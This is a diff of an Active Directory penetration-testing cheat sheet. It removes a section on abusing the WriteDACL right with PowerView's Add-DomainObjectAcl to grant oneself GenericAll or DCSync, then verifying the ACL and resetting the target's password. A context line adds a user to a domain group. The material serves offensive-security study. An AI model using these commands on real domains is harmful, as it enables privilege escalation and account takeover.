@@ -101,22 +101,4 @@ Add yourself to the group:
 ```powershell
 net group testgroup <user> /add /domain
 ```
-&nbsp;
 
----
-&nbsp;
-<span style="font-size: 25px; color:white"><b>Abusing WriteDACL access right</b></span>
-After Get-ObjectAcl (above), check for <span style="color:red">ActiveDirectoryRights : WriteDacl</span>.
-If you find any, that right allows us to add new access rights like GenericAll:
-```powershell
-Add-DomainObjectAcl -TargetIdentity <CN_NAME> -PrincipalIdentity <CURRENT_USER> -Rights All
-```
-You can use the same function to apply additional access rights such as GenericWrite or DCSync if the targeted object is the domain object.
-Dump the DACL again to verify that GenericAll was applied:
-```
-Get-ObjectAcl -Identity <CN> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
-```
-And check the <span style="color:red">ActiveDirectoryRights: GenericAll</span> is there.
-You can now change the CN password.
-
----
